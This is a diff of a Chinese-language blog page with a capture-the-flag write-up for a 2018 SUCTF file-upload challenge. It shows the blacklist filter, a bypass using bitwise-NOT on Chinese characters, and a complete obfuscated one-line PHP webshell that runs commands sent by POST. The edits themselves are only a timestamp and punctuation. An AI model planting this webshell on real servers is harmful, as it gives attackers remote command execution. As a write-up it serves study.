@@ -17,7 +17,7 @@
 <meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/3.png">
 <meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/4.png">
 <meta property="article:published_time" content="2020-06-01T02:53:42.000Z">
-<meta property="article:modified_time" content="2020-06-09T03:26:57.492Z">
+<meta property="article:modified_time" content="2020-06-11T03:11:54.493Z">
 <meta property="article:author" content="作者">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/1.png">
@@ -152,7 +152,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if($contents&#x3D;file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;</span><br><span class="line">    $data&#x3D;substr($contents,5);</span><br><span class="line">    foreach ($black_char as $b) &#123;</span><br><span class="line">        if (stripos($data, $b) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">            die(&quot;illegal char&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>从第六位开始有black_char过滤<br>随便传一个文件用burp测试被过滤字符<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/2.png" alt="2"></p>
 <p>长度为681的都可以通过黑名单<br>考虑使用”异或”和”取反”绕过正则过滤<br>这里参考文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br>发现<code>&lt;?=$_=(&#39;</code>被过滤了<br>这串字符是异或必须要有的字符，所以考虑另一种方法：取反<br>利用UTF-8编码的某个汉字，将其中某个字符取出来，比如‘和’{2} 的结果为 ‘\x8c’ ，取反为字母s。<br>本地php7运行截图<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/3.png" alt="3"></p>
-<p>这里还过滤了空格和换行符所以要把shell写在一行，而php语法代码只有一行的情况下&lt;?php后边要加空格，所以这里用短标签避免</p>
+<p>这里还过滤了空格和换行符，所以要把shell写在一行，而php语法代码只有一行的情况下&lt;?php后边要加空格，所以这里用短标签避免</p>
 <p>最终测试得到shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;$_&#x3D;[];$__.&#x3D;$_;$____&#x3D;$_&#x3D;&#x3D;$_;$___&#x3D;~茉[$____];$___.&#x3D;~内[$____];$___.&#x3D;~茉[$____];$___.&#x3D;~苏[$____];$___.&#x3D;~的[$____];$___.&#x3D;~咩[$____];$_____&#x3D;_;$_____.&#x3D;~课[$____];$_____.&#x3D;~尬[$____];$_____.&#x3D;~笔[$____];$_____.&#x3D;~端[$____];$__________&#x3D;$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>
 <p>此shell命令执行方式：<br>post提交a=(此处为要执行的命令)</p>
